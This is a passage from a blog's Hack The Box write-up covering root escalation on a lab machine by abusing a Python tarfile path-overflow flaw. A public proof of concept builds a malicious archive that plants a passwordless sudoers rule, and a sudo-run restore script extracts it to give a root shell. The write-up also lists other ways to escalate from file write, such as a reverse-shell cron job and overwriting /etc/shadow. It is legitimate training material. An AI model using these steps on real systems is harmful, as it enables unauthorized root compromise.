+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">version</span>     <span class="o">=</span> <span class="s2">&#34;0.9.0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">__author__</span>  <span class="o">=</span> <span class="s2">&#34;Lars Gust</span><span class="se">\u00e4</span><span class="s2">bel (lars@gustaebel.de)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">__credits__</span> <span class="o">=</span> <span class="s2">&#34;Gustavo Niemeyer, Niels Gust</span><span class="se">\u00e4</span><span class="s2">bel, Richard Townsend.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></div><p> <br>
+Nice. Searching for vulnerabilities in this version of the library on the internet, we find this <a href="https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f">Tarfile Realpath Overflow Vulnerability</a>, though it turns out it&rsquo;s not tied to the version of the library, but to the version of Python instead (perhaps since <code>tarfile</code> is a part of the Python standard library). Our Python version (3.12.3) turns out to be vulnerable, so all good here.
+This vulnerability enables arbitrary file write via the <code>TarFile.extractall()</code> function with the <code>filter=&quot;data&quot;</code> parameter set. There are multiple ways we can exploit arbitrary file write in order to obtain root on the system, for example:</p>
+<ul>
+<li>Injecting an SSH public key for root login,</li>
+<li>Creating a reverse shell cron job,</li>
+<li>Adding a NOPASSWD rule to the <code>/etc/sudoers</code> file or any file in the <code>/etc/sudoers.d/</code> directory,</li>
+<li>Overwriting the root entry in the <code>/etc/shadow</code> file.</li>
+</ul>
+<p>For the purposes of this machine, I will add a new sudoers rule that will allow a user to run all commands as root without a password. The rule is going to look like this: <code>&lt;username&gt; ALL=(root) NOPASSWD: ALL</code>.</p>
+<ul>
+<li><code>username</code> - the user to whom the rule applies, e.g. our user, <code>wacky</code>,</li>
+<li><code>ALL</code> - the hosts where the rule applies; <code>ALL</code> means any host,</li>
+<li><code>(root)</code> - the user/group the command can be run as,</li>
+<li><code>NOPASSWD: ALL</code> - allow running all command without a password.</li>
+</ul>
+<p>Exploit credit: <a href="https://github.com/DesertDemons/CVE-2025-4138-4517-POC/blob/main/exploit.py">https://github.com/DesertDemons/CVE-2025-4138-4517-POC/blob/main/exploit.py</a>.</p>
+<ul>
+<li>I&rsquo;ve changed the line containing the sudoers rule (line 354) to my own one for the sake of not simply copypasting the exploit without understanding what it&rsquo;s actually exploiting.</li>
+</ul>
+<p>Transfer the exploit to the target and run it to generate a malicious .tar file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">preset</span> <span class="n">sudoers</span> <span class="o">--</span><span class="n">extra</span> <span class="n">wacky</span> <span class="o">--</span><span class="n">tar</span><span class="o">-</span><span class="n">out</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">backup_clients</span><span class="o">/</span><span class="n">backups</span><span class="o">/</span><span class="n">backup_9999</span><span class="o">.</span><span class="n">tar</span>
+</span></span></code></pre></div><p> <br>
+Now run the following command. The value we use for the <code>-r</code> option doesn&rsquo;t matter, as long as it doesn&rsquo;t violate any checks inside the code (starts with &ldquo;restore_&rdquo; and the remainder is 1–24 characters long and contains only letters, digits, or underscores). Also, despite what the help strings inside the sudo script are saying, we don&rsquo;t need to copy the tarball to <code>/home/wacky/backup_clients/</code> in order to run this script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_exploit
+</span></span></code></pre></div><pre tabindex="0"><code>[+] Backup: backup_9999.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_exploit
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_exploit
+</code></pre><p> <br>
+The malicious archive should have written the new rule to the <code>/etc/sudoers.d/pwned</code> file. Let&rsquo;s see if it was created.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -la /etc/sudoers.d/pwned
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root root <span class="m">31</span> Dec <span class="m">31</span>  <span class="m">1969</span> /etc/sudoers.d/pwned
+</span></span></code></pre></div><p> <br>
+And it was. The success is also indicated by the output of <code>sudo -l</code>, where our new rule is present:</p>
+<pre tabindex="0"><code>Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+    (root) NOPASSWD: ALL
+</code></pre><p> <br>
+Now all that&rsquo;s left is to run a new shell with <code>sudo</code>, and it will be started with the root privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo /bin/bash
+</span></span></code></pre></div><pre tabindex="0"><code>root@wingdata:/opt/backup_clients# whoami
+root
+root@wingdata:/opt/backup_clients# ls -la /root/
+total 44
+drwx------  5 root root 4096 Jun 18 21:16 .
+drwxr-xr-x 18 root root 4096 Feb  9 08:19 ..
+lrwxrwxrwx  1 root root    9 Jan 22 04:41 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwxr-xr-x  3 root root 4096 Nov  3  2025 .cache
+-rw-------  1 root root   20 Nov  3  2025 .lesshst
+drwxr-xr-x  3 root root 4096 Nov  2  2025 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+lrwxrwxrwx  1 root root    9 Jan 22 04:41 .python_history -&gt; /dev/null
+-rw-r-----  1 root root   33 Jun 18 21:16 root.txt
+-rw-r--r--  1 root root   66 Nov  3  2025 .selected_editor
+drwx------  2 root root 4096 Nov  3  2025 .ssh
+-rw-r--r--  1 root root  165 Jan 22 04:41 .wget-hsts
+</code></pre>
+  </div>
+</article>
+
+    
+<footer class="footer">
+
+    
+
+    <div class="social-icons" >
+    <a href="https://www.linkedin.com/in/stepanzhuravlev/" target="_blank" rel="noopener noreferrer me"
+        title="LinkedIn">
+        
+
+<svg xmlns="http://www.w3.org/2000/svg" height="72" viewBox="0 0 74 74" width="72">
+    <g fill="none" fill-rule="evenodd">
+        <path d="M62,62 L51.315625,62 L51.315625,43.8021149 C51.315625,38.8127542 49.4197917,36.0245323 45.4707031,36.0245323 C41.1746094,36.0245323 38.9300781,38.9261103 38.9300781,43.8021149 L38.9300781,62 L28.6333333,62 L28.6333333,27.3333333 L38.9300781,27.3333333 L38.9300781,32.0029283 C38.9300781,32.0029283 42.0260417,26.2742151 49.3825521,26.2742151 C56.7356771,26.2742151 62,30.7644705 62,40.051212 L62,62 Z M16.349349,22.7940133 C12.8420573,22.7940133 10,19.9296567 10,16.3970067 C10,12.8643566 12.8420573,10 16.349349,10 C19.8566406,10 22.6970052,12.8643566 22.6970052,16.3970067 C22.6970052,19.9296567 19.8566406,22.7940133 16.349349,22.7940133 Z M11.0325521,62 L21.769401,62 L21.769401,27.3333333 L11.0325521,27.3333333 L11.0325521,62 Z" fill="currentColor"/>
+    </g>
+</svg>
+
+
+
+
+        &nbsp&nbsp;LinkedIn
+    </a>
+    <a href="https://github.com/IntelliJr/" target="_blank" rel="noopener noreferrer me"
+        title="GitHub">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+        &nbsp&nbsp;GitHub
+    </a>
+    <a href="https://app.hackthebox.com/public/users/1428044" target="_blank" rel="noopener noreferrer me"
+        title="Hack the Box">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" fill="currentColor"
+    stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+        &nbsp&nbsp;Hack The Box
+    </a>
+</div>
+
+</footer>
+
+
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+
+
+
+</body>
+
+</html>
